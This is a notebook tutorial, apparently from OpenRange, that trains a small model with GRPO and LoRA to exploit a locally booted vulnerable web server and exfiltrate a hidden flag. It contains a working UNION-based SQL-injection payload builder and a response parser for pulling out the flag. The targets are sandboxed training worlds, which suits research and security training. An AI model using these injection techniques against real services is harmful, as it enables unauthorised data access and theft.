# Train a model to exploit a live web service with TRL GRPO + LoRA

OpenRange admits **content-addressed** agent-training worlds. This notebook trains
a small model on the *cyber* pack: every rollout boots a **real HTTP server** with
a planted vulnerability, and the policy must **exploit it over the wire** and
exfiltrate a hidden flag — graded by the world itself, no static dataset of
"correct" attacks.

It is the same torch-free TRL seam that also trains file-editing agents, with a cyber **action surface**:
the policy gets the `http_get` and `submit` tools you pass in. The adapter is
unchanged — the generic `EpisodeEnv` reflects whatever tools you bring (these are
OpenRange's reference `WEB_TOOLS`; bring your own to change the surface).

Runs on a laptop (MPS or CUDA). The point is that **training is a loop that evolves
the world**: §3 maps the reward surface, then §7 runs the loop — and you watch the
gym **harden the world** as it gets solved (driven by a reference policy on a
laptop, by the model's own climb on a GPU). The opposite of grinding one fixed
benchmark.

For the simplest file-editing surface (a one-line bug fix), see
`trl_grpo_lora.ipynb`.

## 1. Install

```bash
uv pip install "openrange-trl[train]"   # torch, transformers, trl, datasets, accelerate, peft
```

`import openrange` never needs this extra — only the live training path below does.

## 2. Admit a cyber world

`admit` freezes a procedural cyber world into a **content-addressed snapshot**. We
pin a **SQL-injection** world (`vuln_kinds`, `seed=0`): a deterministic target whose
pentest entrypoint is an injectable `GET` over a `db`-backed endpoint. Each world
yields two tasks (`webapp.build`, `webapp.pentest`); we train on the offensive one.

In [1]:
from cyber_webapp import WebappPack

from openrange.core.admit import AdmissionFailure, admit

pack = WebappPack()
snapshot = admit(
    pack,
    manifest={
        "world": {"goal": "recover the hidden flag"},
        "pack": {"id": "webapp"},
        "runtime": {"tick": {"mode": "off"}},
        "npc": [],
        "seed": 0,
        # Pin the shape so the world is reproducibly a SQL-injection-over-the-response
        # target (a `db` response-leak + the `sql_injection` oracle), independent of the
        # pack's default vuln mix.
        "loot_shapes": {"db": 1, "file": 0},
        "vuln_kinds": {"sql_injection": 1},
    },
)
assert not isinstance(snapshot, AdmissionFailure), snapshot
snapshot.snapshot_id

'sha256:0279d1d5a9df43477abdf88d277fd91e44db3f5dd8a01f66d82ee9148c8625f6'

## 3. See the reward before you train

The reward is the world's held-out verdict over the **HTTP path**. The pentest
family scores three subgoals — reach the endpoint, extract *something*, submit the
*right* flag — so `episode_reward` yields a four-rung surface. Driving the env's
tools by hand maps it: no model, no GPU, one fresh booted server per call.

We read the injection's coordinates (endpoint, parameter, table/column, quote
context) from the world graph, run a **real SQL injection** that leaks the hidden
column, and exfiltrate the flag from the response — the top rung.

In [2]:
import json
import re
from urllib.parse import urlencode

from openrange_trl import EpisodeEnv

from examples.tools import WEB_TOOLS  # the reference http_get + submit tools
from openrange.core.episode import EpisodeService


def pentest_task(snap):
    return next(t for t in snap.tasks if t.meta.get("family") == "webapp.pentest")


def exploit_path(snap):
    # Read the injection's coordinates from *this* world's graph and match its
    # quote context — a constant payload breaks as the world evolves. The hidden
    # flag sits in a column the base query never selects, so a UNION pulls it.
    task = pentest_task(snap)
    entry = snap.graph.nodes[task.entrypoints[0]].attrs["public_url"]
    p = next(
        v.attrs["params"]
        for v in snap.graph.by_kind("vulnerability")
        if v.attrs.get("kind") == "sql_injection"
    )
    union = f"UNION SELECT key, {p['leak_column']} FROM {p['table']} -- "
    prefix = {"numeric": "0 ", "double": '" '}.get(p.get("context"), "' ")
    return f"{entry}?{urlencode({p['target_param']: prefix + union})}"


def exfiltrate(response):
    body = response.split(chr(10), 1)[-1]
    uuid = r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}"
    for row in json.loads(body).get("rows", []):
        for value in row.values():
            if re.fullmatch(uuid, str(value)):
                return str(value)
    return ""


def solve(env, snap):
    env.submit(json.dumps({"flag": exfiltrate(env.http_get(exploit_path(snap)))}))


def grade(name, act):
    svc = EpisodeService(pack, f"or-runs/cyber/{name}")
    env = EpisodeEnv(
        service=svc, snapshots={snapshot.snapshot_id: snapshot}, tools=WEB_TOOLS
    )
    env.reset(snapshot_id=snapshot.snapshot_id, task_id=pentest_task(snapshot).id)
    act(env)
    env._finalize()
    print(f"{name:<22} reward={env.reward:.3f}  resolved={env.report.passed}")
    svc.close()


entry = snapshot.graph.nodes[pentest_task(snapshot).entrypoints[0]].attrs["public_url"]


def reach(e):
    e.http_get(entry)


def wrong(e):
    e.http_get(entry)
    e.submit(json.dumps({"flag": "guess"}))


grade("no-op (no request)", lambda e: None)
grade("reach endpoint", reach)
grade("reach + wrong flag", wrong)
grade("exploit + submit", lambda e: solve(e, snapshot))

no-op (no request)     reward=0.000  resolved=False
reach endpoint         reward=0.333  resolved=False
reach + wrong flag     reward=0.667  resolved=False
exploit + submit       reward=1.000  resolved=True


Four behaviors, four distinct grades:

| behavior | reward | why |
|------|--------|-----|
| no-op | **0.0** | no subgoal touched |
| reach endpoint | **0.333** | `reached_endpoint` only |
| reach + wrong flag | **0.667** | `+ extracted_anything`, but wrong |
| exploit + submit | **1.0** | SQLi exfiltrates the real flag → success |

That `0.0 → 1.0` ladder is the **spread GRPO turns into a gradient**. Training is
teaching the policy to find the *targeted* injection on its own. (This surface is
asserted live in `tests/test_trl_cyber.py`, so it can't silently drift.)

## 4. Wrap the world as a TRL environment

The torch-free adapter exposes the three seams TRL needs, with the web action
surface — the tools you bring (here OpenRange's reference `WEB_TOOLS`):

- **`build_grpo_dataset`** — the prompt rows (we keep the pentest task), tagged
  with `snapshot_id`. The policy sees the tools via TRL's tool schemas, so a row
  is just the task instruction.
- **`make_environment_factory(..., tools=WEB_TOOLS)`** — one `EpisodeEnv` per
  rollout: a fresh booted server, with the tools you pass (`http_get`, `submit`)
  bound to it.
- **`make_reward_func`** — grades the final interaction with the held-out verdict.

In [3]:
from datasets import Dataset
from openrange_trl import (
    build_grpo_dataset,
    make_environment_factory,
    make_reward_func,
)

rows = [
    row for row in build_grpo_dataset(snapshot, repeat=4) if "pentest" in row["task_id"]
]
dataset = Dataset.from_list(rows)
environment_factory = make_environment_factory(
    pack, [snapshot], "or-runs/cyber/envs", tools=WEB_TOOLS
)
reward_func = make_reward_func()

## 5. Load the policy + a LoRA adapter

LoRA adapters on a small instruct model — the base stays frozen (fits a laptop),
GRPO updates only the low-rank adapters. Bump `model_name` to a larger instruct
model for rollouts strong enough to actually land the injection.

In [4]:
from peft import LoraConfig
from transformers import AutoModelForCausalLM, AutoTokenizer

model_name = "Qwen/Qwen2.5-0.5B-Instruct"
model = AutoModelForCausalLM.from_pretrained(model_name)
tokenizer = AutoTokenizer.from_pretrained(model_name)

lora = LoraConfig(
    r=16,
    lora_alpha=32,
    lora_dropout=0.0,
    target_modules=["q_proj", "k_proj", "v_proj", "o_proj"],
    task_type="CAUSAL_LM",
)

Loading weights:   0%|          | 0/290 [00:00<?, ?it/s]

Loading weights: 100%|██████████| 290/290 [00:00<00:00, 10377.51it/s]

## 6. Configure GRPO

Each step samples `num_generations` completions of the **same** prompt — and
`make_environment_factory` boots **one fresh server per completion**, so those N
rollouts are N live worlds attacked **at once** and graded together. `beta=0` drops
the reference model; `use_vllm=False` generates through transformers;
`max_tool_calling_iterations` bounds the recon→exploit→submit turns. `max_steps=1`
makes one call here **one training round** — §7 wraps rounds into the curriculum.

In [5]:
from trl import GRPOConfig

num_generations = 4
config = GRPOConfig(
    output_dir="or-runs/cyber/trainer",
    per_device_train_batch_size=num_generations,
    num_generations=num_generations,
    steps_per_generation=1,
    gradient_accumulation_steps=1,
    max_steps=1,
    learning_rate=1e-4,
    beta=0.0,
    temperature=1.0,
    max_completion_length=256,
    max_tool_calling_iterations=4,
    use_vllm=False,
    log_completions=False,
    logging_steps=1,
    report_to="none",
    disable_tqdm=True,
    save_strategy="no",
    bf16=False,
    fp16=False,
)

## 7. Train — and the world trains back

Training here is a **loop**, not gradient steps on a fixed task. Each round runs
GRPO on the current world; then `auto_evolve` reads the round's reward spread and
moves the world toward the policy's frontier — **harden** when the group is solving,
**soften** when it's stuck — re-admits it (so the new world is still provably
solvable), and the next round trains on *that*. One round is one
`GRPOTrainer.train()`. The gym tracks the agent — this is what "not a static
benchmark" means in practice.

In [6]:
from openrange_trl import reward_variance_policy
from trl import GRPOTrainer

from openrange.core.curriculum import auto_evolve
from openrange.training import episode_reward


def grpo_round(snap):
    rows = [
        r
        for r in build_grpo_dataset(snap, repeat=num_generations)
        if "pentest" in r["task_id"]
    ]
    factory = make_environment_factory(
        pack, [snap], f"or-runs/cyber/{snap.snapshot_id[-12:]}", tools=WEB_TOOLS
    )
    trainer = GRPOTrainer(
        model=model,
        reward_funcs=[reward_func],
        args=config,
        train_dataset=Dataset.from_list(rows),
        processing_class=tokenizer,
        environment_factory=factory,
        peft_config=lora,
    )
    trainer.train()
    return [e.report for e in (trainer.environments or ()) if e.report is not None]


reports = grpo_round(snapshot)
rewards = [round(episode_reward(r).scalar, 3) for r in reports]
print("one real GRPO round → rewards", rewards)

{'loss': '0.5017', 'grad_norm': '2.517e+05', 'learning_rate': '0.0001', 'num_tokens': '2011', 'completions/mean_length': '127.8', 'completions/min_length': '74', 'completions/max_length': '256', 'completions/clipped_ratio': '0.25', 'completions/mean_terminated_length': '85', 'completions/min_terminated_length': '74', 'completions/max_terminated_length': '98', 'tools/call_frequency': '0.75', 'tools/failure_frequency': '0', 'rewards/reward_func/mean': '0.25', 'rewards/reward_func/std': '0.1667', 'reward': '0.25', 'reward_std': '0.1667', 'frac_reward_zero_std': '0', 'entropy': '3.35', 'clip_ratio/low_mean': '0', 'clip_ratio/low_min': '0', 'clip_ratio/high_mean': '0', 'clip_ratio/high_max': '0', 'clip_ratio/region_mean': '0', 'step_time': '20.19', 'epoch': '0.25'}
{'train_runtime': '20.5', 'train_samples_per_second': '0.195', 'train_steps_per_second': '0.049', 'train_loss': '0.5017', 'epoch': '0.25'}
one real GRPO round → rewards [0.0, 0.333, 0.333, 0.333]


On a laptop the 0.5B mostly **reaches the endpoint but never lands the flag**, so the
reward spread stays alive and `auto_evolve` *holds* the world (mastery needs a bigger
model + GPU, where the policy's climb collapses the spread and drives the curriculum).
To watch the loop **move** now, drive each round with the reference `solve` from §3 —
a stand-in for a trained policy. Swap `grpo_round` back in on a GPU; the loop below is
identical.

In [7]:
def scripted_round(snap):
    # A reference policy that always solves — a stand-in for a trained model, so the
    # curriculum visibly climbs without a GPU.
    factory = make_environment_factory(
        pack, [snap], f"or-runs/cyber/evolve-{snap.snapshot_id[-12:]}", tools=WEB_TOOLS
    )
    reports = []
    for _ in range(num_generations):
        env = factory()
        env.reset(snapshot_id=snap.snapshot_id, task_id=pentest_task(snap).id)
        solve(env, snap)
        env._finalize()
        reports.append(env.report)
        env.service.close()
    return reports


def evolve_meta(snap):
    # The patch path nests _evolve under the re-admitted manifest; a builder-grow
    # writes it at the top level. Read whichever is present.
    return snap.lineage.get("_evolve") or snap.lineage.get("manifest", {}).get(
        "_evolve", {}
    )


def run_curriculum(snap, *, rounds, run_round):
    chain = [snap]
    for r in range(1, rounds + 1):
        reports = run_round(snap)
        rewards = [round(episode_reward(x).scalar, 3) for x in reports]
        evolved = auto_evolve(snap, *reports, pack=pack, policy=reward_variance_policy)
        meta = {} if evolved is None else evolve_meta(evolved)
        move = (
            "converged" if evolved is None else meta.get("note", meta.get("kind", ""))
        )
        print(f"round {r}: {snap.snapshot_id[-12:]}  rewards={rewards}  →  {move}")
        if evolved is None:
            break
        snap = evolved
        chain.append(snap)
    return chain


chain = run_curriculum(snapshot, rounds=5, run_round=scripted_round)

round 1: e9148c8625f6  rewards=[1.0, 1.0, 1.0, 1.0]  →  build level 2 on ep_orders-api_0


round 2: c25fabbbdc2e  rewards=[1.0, 1.0, 1.0, 1.0]  →  build level 3 on ep_orders-api_0


round 3: abc8470d00d3  rewards=[1.0, 1.0, 1.0, 1.0]  →  add broken_authz on ep_orders-db_0


round 4: 41114faeae7a  rewards=[1.0, 1.0, 1.0, 1.0]  →  add command_injection on ep_orders-db_0


round 5: 9eb0ac5a4341  rewards=[1.0, 1.0, 1.0, 1.0]  →  add config_disclosure on ep_orders-db_0


## 8. The curriculum is a lineage

Every round's world is a fresh, **admission-checked** child snapshot — `auto_evolve`
mutates the graph, re-admits (so the harder world is still provably solvable), and
tags the child with its parent. Training doesn't grind one fixed task; it produces a
**chain of worlds**, each content-addressed and fully attributable.

In [8]:
for snap in chain:
    kinds = sorted(
        str(n.attrs.get("kind")) for n in snap.graph.by_kind("vulnerability")
    )
    parent = (evolve_meta(snap).get("parent_snapshot_id") or "")[-12:] or "root"
    print(f"{snap.snapshot_id[-12:]}  parent={parent:>12}  vulns={kinds}")

e9148c8625f6  parent=        root  vulns=['sql_injection', 'sql_injection', 'sql_injection']
c25fabbbdc2e  parent=e9148c8625f6  vulns=['sql_injection', 'sql_injection', 'sql_injection']
abc8470d00d3  parent=c25fabbbdc2e  vulns=['sql_injection', 'sql_injection', 'sql_injection']
41114faeae7a  parent=abc8470d00d3  vulns=['broken_authz', 'sql_injection', 'sql_injection', 'sql_injection']
9eb0ac5a4341  parent=41114faeae7a  vulns=['broken_authz', 'command_injection', 'sql_injection', 'sql_injection', 'sql_injection']
40178f1a5bcb  parent=9eb0ac5a4341  vulns=['broken_authz', 'command_injection', 'config_disclosure', 'sql_injection', 'sql_injection', 'sql_injection']


## Where this goes

You watched the world **evolve with the agent** — that loop is the whole point: the
gym hardens toward wherever the policy is, instead of handing it the same fixed task
forever. Two things take it past a laptop:

- **A real climb.** Swap the reference `solve` for `grpo_round` + a larger instruct
  model on a GPU. Now the *policy's* own improvement collapses the reward spread and
  drives the evolution — the same loop, no stand-in.
- **Throughput.** Each round's `num_generations` rollouts boot at once; TRL's
  `AsyncGRPOTrainer` pipelines hundreds against a vLLM server with the same
  `make_environment_factory`. Both trainers reset worlds serially, so a pooled /
  fast world realization is the gym-side lever that keeps a big batch from stalling
  on boots (#294).

The torch-free seam + reward/curriculum tests live in `openrange-trl` +
`tests/test_trl_cyber.py`; the gated test that runs a real `GRPOTrainer` across
evolving rounds is `tests/test_trl_live.py`.